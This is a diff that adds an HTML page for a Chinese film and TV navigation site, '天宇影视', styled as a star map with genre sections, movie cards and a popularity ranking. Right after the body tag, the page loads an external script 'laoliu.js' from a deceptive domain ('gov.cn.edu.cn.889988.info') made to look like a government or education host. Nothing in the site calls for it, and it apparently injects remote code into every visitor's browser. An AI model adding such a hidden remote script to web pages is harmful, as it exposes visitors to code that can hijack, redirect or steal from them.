@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>天宇影视 - 星图里的影视导航 | tianyuyingshi-h5.github.io</title>
+<meta name="description" content="天宇影视（tianyuyingshi-h5.github.io）是一座星空观测台式的影视导航：电影、剧集、动漫、综艺按星座分区整理，标注画质与星等，手机电脑自适应，在深空里挑一部好片。">
+<meta name="keywords" content="天宇影视, 高清影视导航, 电影电视剧, 星空风格, 影视索引, tianyuyingshi-h5">
+<meta name="author" content="天宇影视">
+<meta name="robots" content="index, follow">
+<style>
+  :root{
+    --space:#05060f;
+    --space2:#0a0e1f;
+    --panel:#0e1430;
+    --panel2:#121a3d;
+    --line:#26335f;
+    --blue:#5b7cff;
+    --purple:#6d5bd0;
+    --silver:#dfe7ff;
+    --gold:#ffd479;
+    --cyan:#5be0d0;
+    --muted:#9aa6cf;
+    --sans:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+    --mono:'SFMono-Regular',Consolas,monospace;
+    --serif:'Georgia','Songti SC',serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:var(--sans);background:var(--space);color:var(--silver);
+    line-height:1.7;overflow-x:hidden;position:relative;min-height:100vh;
+    background-image:
+      radial-gradient(900px 500px at 78% -8%, #6d5bd033 0, transparent 60%),
+      radial-gradient(700px 400px at 12% 4%, #5be0d022 0, transparent 55%),
+      radial-gradient(circle at 50% 120%, #1b2a4a 0, transparent 60%);
+  }
+  /* 星场 */
+  body::before{
+    content:"";position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.9;
+    background-image:
+      radial-gradient(1px 1px at 20% 30%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 40% 70%, #cfe0ff 50%, transparent 51%),
+      radial-gradient(1.5px 1.5px at 65% 20%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 80% 60%, #ffe9c2 50%, transparent 51%),
+      radial-gradient(1px 1px at 55% 85%, #fff 50%, transparent 51%),
+      radial-gradient(1.5px 1.5px at 12% 80%, #cfe0ff 50%, transparent 51%),
+      radial-gradient(1px 1px at 90% 35%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 33% 12%, #fff 50%, transparent 51%);
+    background-repeat:repeat;background-size:600px 600px;
+    animation:twinkle 5s ease-in-out infinite alternate;
+  }
+  @keyframes twinkle{from{opacity:.55;}to{opacity:.95;}}
+  a{color:var(--cyan);text-decoration:none;transition:.2s;}
+  a:hover{color:var(--gold);}
+  .wrap{max-width:1080px;margin:0 auto;padding:0 1.2rem;position:relative;z-index:2;}
+
+  /* 顶栏 */
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:1.1rem 1.2rem;position:sticky;top:0;z-index:60;
+    background:linear-gradient(var(--space),transparent);backdrop-filter:blur(6px);
+  }
+  .brand{display:flex;align-items:center;gap:.6rem;font-family:var(--serif);
+    font-weight:800;font-size:1.3rem;color:var(--silver);letter-spacing:.5px;}
+  .orbit-logo{width:22px;height:22px;border-radius:50%;border:1.5px solid var(--cyan);position:relative;flex:none;}
+  .orbit-logo::before{content:"";position:absolute;width:5px;height:5px;border-radius:50%;background:var(--gold);
+    top:-2px;left:50%;box-shadow:0 0 8px var(--gold);}
+  .orbit-logo::after{content:"";position:absolute;inset:-5px;border:1px solid #ffffff20;border-radius:50%;
+    border-top-color:var(--cyan);animation:spin 6s linear infinite;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .nav{display:flex;gap:1.2rem;font-family:var(--mono);font-size:.82rem;}
+  .nav a{color:var(--muted);}
+  .nav a:hover{color:var(--gold);}
+
+  /* 通用栏目 */
+  section{position:relative;padding:4.5rem 0 3.5rem;border-bottom:1px solid var(--line);}
+  .sec-head{display:flex;align-items:center;gap:.7rem;margin-bottom:2rem;}
+  .sec-no{font-family:var(--mono);font-size:.72rem;color:var(--cyan);border:1px solid var(--line);
+    padding:.15rem .55rem;border-radius:20px;}
+  h2.sec-title{font-family:var(--serif);font-size:clamp(1.7rem,4vw,2.6rem);color:var(--silver);
+    letter-spacing:.5px;text-shadow:0 0 18px #5b7cff40;}
+
+  /* 栏目1：观测台 */
+  #home{padding-top:3rem;text-align:center;overflow:hidden;}
+  .scope{position:relative;width:min(420px,86vw);height:min(420px,86vw);margin:0 auto 1.5rem;}
+  .ring{position:absolute;inset:0;border-radius:50%;border:1px solid var(--line);}
+  .ring.r2{inset:12%;border-color:#ffffff14;animation:spin 60s linear infinite;}
+  .ring.r3{inset:26%;border-style:dashed;border-color:#5b7cff33;animation:spin 90s linear infinite reverse;}
+  .ring.r4{inset:40%;border-color:#ffd47922;}
+  .axis{position:absolute;left:50%;top:0;bottom:0;width:1px;background:linear-gradient(transparent,#ffffff20,transparent);}
+  .axis.h{left:0;right:0;top:50%;bottom:auto;height:1px;width:auto;}
+  .pole{position:absolute;left:50%;top:50%;width:10px;height:10px;border-radius:50%;
+    transform:translate(-50%,-50%);background:var(--gold);box-shadow:0 0 18px var(--gold);z-index:3;}
+  .constellation{position:absolute;inset:0;z-index:2;}
+  .constellation polyline{fill:none;stroke:var(--cyan);stroke-width:1;opacity:.6;stroke-dasharray:3 3;}
+  .constellation circle{fill:#fff;}
+  #home h1{position:relative;z-index:4;font-family:var(--serif);
+    font-size:clamp(2.6rem,8vw,5rem);line-height:1;letter-spacing:-1px;
+    text-shadow:0 0 24px #5b7cff55;}
+  #home h1 em{font-style:normal;color:var(--gold);}
+  #home p.lead{max-width:580px;margin:1.4rem auto 1.8rem;color:var(--muted);font-size:1.05rem;}
+  .star-tags{display:flex;gap:.6rem;justify-content:center;flex-wrap:wrap;margin-bottom:1.8rem;}
+  .stag{font-family:var(--mono);font-size:.72rem;color:var(--cyan);border:1px solid var(--line);
+    background:var(--panel);padding:.25rem .7rem;border-radius:20px;}
+  .cta{display:inline-block;background:transparent;color:var(--gold);font-weight:700;
+    border:1px solid var(--gold);padding:.7rem 1.8rem;border-radius:30px;
+    box-shadow:0 0 18px #ffd47922;font-family:var(--serif);}
+  .cta:hover{background:var(--gold);color:var(--space);transform:translateY(-2px);}
+
+  /* 栏目2：星座分区 */
+  #category .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1.1rem;}
+  .zodiac{background:linear-gradient(160deg,var(--panel),var(--space2));
+    border:1px solid var(--line);border-radius:14px;padding:1.2rem;position:relative;transition:.2s;}
+  .zodiac:hover{transform:translateY(-4px);border-color:var(--cyan);box-shadow:0 0 24px #5be0d018;}
+  .glyph{font-size:1.5rem;color:var(--gold);text-shadow:0 0 10px #ffd47955;}
+  .zodiac h3{font-family:var(--serif);font-size:1.05rem;margin:.4rem 0 .2rem;color:var(--silver);}
+  .zodiac p{font-size:.78rem;color:var(--muted);}
+  .ra{position:absolute;top:10px;right:12px;font-family:var(--mono);font-size:.6rem;color:var(--cyan);opacity:.7;}
+
+  /* 栏目3：星体卡片 */
+  #latest .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.3rem;}
+  .body-card{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.2s;}
+  .body-card:hover{transform:translateY(-3px);box-shadow:0 0 26px #5b7cff22;}
+  .orb{height:140px;position:relative;display:flex;align-items:center;justify-content:center;font-size:3rem;
+    background:radial-gradient(circle at 30% 30%,#2a3a6e,#0a0e1f 70%);}
+  .orb::after{content:"";position:absolute;inset:0;
+    background:radial-gradient(circle at 70% 40%,#ffd47922,transparent 40%);}
+  .mag{position:absolute;top:10px;left:10px;font-family:var(--mono);font-size:.62rem;
+    background:var(--space);border:1px solid var(--line);color:var(--gold);padding:.1rem .45rem;border-radius:6px;z-index:2;}
+  .body-card .info{padding:1rem 1.1rem;}
+  .body-card h3{font-family:var(--serif);font-size:1.02rem;}
+  .body-card .sub{font-size:.76rem;color:var(--muted);margin:.2rem 0 .6rem;}
+  .body-card .row{display:flex;align-items:center;justify-content:space-between;}
+  .look{border:1px solid var(--cyan);color:var(--cyan);font-size:.78rem;padding:.2rem .7rem;border-radius:20px;}
+  .look:hover{background:var(--cyan);color:var(--space);}
+
+  /* 栏目4：星等榜 */
+  #ranking .stars{max-width:760px;}
+  .star-row{display:grid;grid-template-columns:46px 1fr auto;gap:1rem;align-items:center;
+    padding:1rem 0;border-bottom:1px solid var(--line);}
+  .mag-no{font-family:var(--serif);font-weight:800;font-size:1.2rem;color:var(--gold);text-align:center;}
+  .mag-no.top{color:var(--cyan);text-shadow:0 0 10px var(--cyan);}
+  .star-row h3{font-size:1rem;}
+  .star-row .sub{font-size:.74rem;color:var(--muted);}
+  .bright{height:8px;background:var(--space2);border:1px solid var(--line);border-radius:6px;margin-top:.4rem;overflow:hidden;}
+  .bright .fill{height:100%;background:linear-gradient(90deg,var(--blue),var(--cyan),var(--gold));}
+  .bval{font-family:var(--mono);font-size:.8rem;color:var(--cyan);}
+
+  /* 栏目5：说明 */
+  #about .note{background:var(--panel);border:1px solid var(--line);border-left:4px solid var(--purple);
+    border-radius:12px;padding:1.6rem;font-size:.92rem;color:var(--muted);}
+  #about .note b{color:var(--silver);}
+  .url{font-family:var(--mono);color:var(--cyan);margin-top:.8rem;display:inline-block;}
+
+  footer{text-align:center;font-family:var(--mono);font-size:.78rem;color:var(--muted);
+    padding:2.5rem 1rem 3rem;}
+
+  @media(max-width:768px){
+    .nav{display:none;}
+    .scope{width:300px;height:300px;}
+    #category .grid{grid-template-columns:1fr 1fr;}
+    #latest .grid{grid-template-columns:1fr;}
+    .star-row{grid-template-columns:38px 1fr;}
+    .bval{display:none;}
+  }
+  @media(max-width:420px){
+    #category .grid{grid-template-columns:1fr;}
+  }
+  @media(prefers-reduced-motion:reduce){
+    *{animation:none!important;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="brand"><span class="orbit-logo"></span>天宇影视</div>
+  <nav class="nav">
+    <a href="#home">观测台</a>
+    <a href="#category">星座区</a>
+    <a href="#latest">星体</a>
+    <a href="#ranking">星等</a>
+    <a href="#about">星志</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <!-- 栏目1 -->
+  <section id="home">
+    <div class="scope" aria-hidden="true">
+      <div class="ring r2"></div>
+      <div class="ring r3"></div>
+      <div class="ring r4"></div>
+      <div class="axis"></div>
+      <div class="axis h"></div>
+      <svg class="constellation" viewBox="0 0 200 200" preserveAspectRatio="xMidYMid meet">
+        <polyline points="60,40 90,70 80,110 120,130 110,165"/>
+        <circle cx="60" cy="40" r="2"/><circle cx="90" cy="70" r="2.4"/>
+        <circle cx="80" cy="110" r="2"/><circle cx="120" cy="130" r="2.6"/>
+        <circle cx="110" cy="165" r="2"/>
+      </svg>
+      <div class="pole"></div>
+    </div>
+    <h1>天宇影视<br><em>星图寻片</em></h1>
+    <p class="lead">tianyuyingshi-h5.github.io —— 把电影、剧集、动漫、综艺铺成一片星图。按星座分区，标好星等与画质，在深空里慢慢对准你想看的那一颗。</p>
+    <div class="star-tags">
+      <span class="stag">✦ 4K 星体原画</span>
+      <span class="stag">✦ 1080P 稳定轨道</span>
+      <span class="stag">✦ 中字星语</span>
+      <span class="stag">✦ 无流星弹窗</span>
+    </div>
+    <a href="#latest" class="cta">对准星体 →</a>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="category">
+    <div class="sec-head"><span class="sec-no">SECTOR 01</span><h2 class="sec-title">星座分区</h2></div>
+    <div class="grid">
+      <div class="zodiac"><span class="ra">RA 04h</span><div class="glyph">♈</div><h3>猎户片场</h3><p>动作 / 战争 / 西部大片</p></div>
+      <div class="zodiac"><span class="ra">RA 09h</span><div class="glyph">♉</div><h3>天琴情书</h3><p>爱情 / 青春 / 治愈</p></div>
+      <div class="zodiac"><span class="ra">RA 02h</span><div class="glyph">♊</div><h3>双子动漫</h3><p>新番 / 剧场版 / 国漫</p></div>
+      <div class="zodiac"><span class="ra">RA 00h</span><div class="glyph">♋</div><h3>仙女科幻</h3><p>太空 / 灾变 / 硬核科幻</p></div>
+      <div class="zodiac"><span class="ra">RA 14h</span><div class="glyph">♌</div><h3>狮心剧集</h3><p>权谋 / 家族史 / 长线叙事</p></div>
+      <div class="zodiac"><span class="ra">RA 20h</span><div class="glyph">♍</div><h3>处女综艺</h3><p>脱口秀 / 慢综艺 / 访谈</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="latest">
+    <div class="sec-head"><span class="sec-no">SECTOR 02</span><h2 class="sec-title">今日星体</h2></div>
+    <div class="grid">
+      <article class="body-card">
+        <div class="orb">🏜️<span class="mag">mag 4K</span></div>
+        <div class="info"><h3>沙丘3：救世主</h3><div class="sub">科幻 / 156min / 中字星语</div>
+          <div class="row"><span class="sub">赤经 22h·深空</span><a href="#" class="look">观测</a></div></div>
+      </article>
+      <article class="body-card">
+        <div class="orb">👑<span class="mag">mag 合集</span></div>
+        <div class="info"><h3>庆余年2</h3><div class="sub">古装权谋 / 32集</div>
+          <div class="row"><span class="sub">赤经 14h·狮心</span><a href="#" class="look">观测</a></div></div>
+      </article>
+      <article class="body-card">
+        <div class="orb">🔥<span class="mag">mag BD</span></div>
+        <div class="info"><h3>周处除三害</h3><div class="sub">动作犯罪 / 134min</div>
+          <div class="row"><span class="sub">赤经 04h·猎户</span><a href="#" class="look">观测</a></div></div>
+      </article>
+      <article class="body-card">
+        <div class="orb">🏎️<span class="mag">mag 1080P</span></div>
+        <div class="info"><h3>飞驰人生2</h3><div class="sub">喜剧 / 118min</div>
+          <div class="row"><span class="sub">赤经 09h·天琴</span><a href="#" class="look">观测</a></div></div>
+      </article>
+      <article class="body-card">
+        <div class="orb">⚔️<span class="mag">mag 4K</span></div>
+        <div class="info"><h3>咒术回战 S3</h3><div class="sub">动漫 / 连载中</div>
+          <div class="row"><span class="sub">赤经 02h·双子</span><a href="#" class="look">观测</a></div></div>
+      </article>
+      <article class="body-card">
+        <div class="orb">🌸<span class="mag">mag 杜比</span></div>
+        <div class="info"><h3>花束般的恋爱</h3><div class="sub">爱情 / 124min</div>
+          <div class="row"><span class="sub">赤经 09h·天琴</span><a href="#" class="look">观测</a></div></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="ranking">
+    <div class="sec-head"><span class="sec-no">SECTOR 03</span><h2 class="sec-title">星等亮度榜</h2></div>
+    <div class="stars">
+      <div class="star-row">
+        <div class="mag-no top">★</div>
+        <div><h3>繁花</h3><div class="sub">国产剧 / 王家卫美学</div>
+          <div class="bright"><div class="fill" style="width:98%"></div></div></div>
+        <div class="bval">mag 0.2</div>
+      </div>
+      <div class="star-row">
+        <div class="mag-no top">★</div>
+        <div><h3>庆余年2</h3><div class="sub">古装权谋</div>
+          <div class="bright"><div class="fill" style="width:95%"></div></div></div>
+        <div class="bval">mag 0.5</div>
+      </div>
+      <div class="star-row">
+        <div class="mag-no top">★</div>
+        <div><h3>沙丘3</h3><div class="sub">科幻 / 4K 深空</div>
+          <div class="bright"><div class="fill" style="width:92%"></div></div></div>
+        <div class="bval">mag 0.8</div>
+      </div>
+      <div class="star-row">
+        <div class="mag-no">☆</div>
+        <div><h3>周处除三害</h3><div class="sub">动作犯罪</div>
+          <div class="bright"><div class="fill" style="width:88%"></div></div></div>
+        <div class="bval">mag 1.2</div>
+      </div>
+      <div class="star-row">
+        <div class="mag-no">☆</div>
+        <div><h3>热辣滚烫</h3><div class="sub">励志喜剧</div>
+          <div class="bright"><div class="fill" style="width:84%"></div></div></div>
+        <div class="bval">mag 1.6</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="about">
+    <div class="sec-head"><span class="sec-no">SECTOR 04</span><h2 class="sec-title">星志札记</h2></div>
+    <div class="note">
+      <p><b>天宇影视</b>是一座影视导航观测台，只做分类索引、画质标注与入口整理，<b>不托管视频文件，也不内置播放源</b>。</p>
+      <p style="margin-top:.6rem">内容用于个人观影决策与学习交流；实际观看请通过正规授权平台，遵守当地网络与版权规范。星图很美，别越界。</p>
+      <a href="#" class="url">✦ https://tianyuyingshi-h5.github.io</a>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  天宇影视 / tianyuyingshi-h5.github.io<br>
+  © 2026 星图观测台 · Celestial Map Edition
+</footer>
+
+<script>
+  document.querySelectorAll('a[href^="#"]').forEach(a=>{
+    a.addEventListener('click',e=>{
+      e.preventDefault();
+      const t=document.querySelector(a.getAttribute('href'));
+      if(t)t.scrollIntoView({behavior:'smooth'});
+    });
+  });
+</script>
+</body>
+</html>
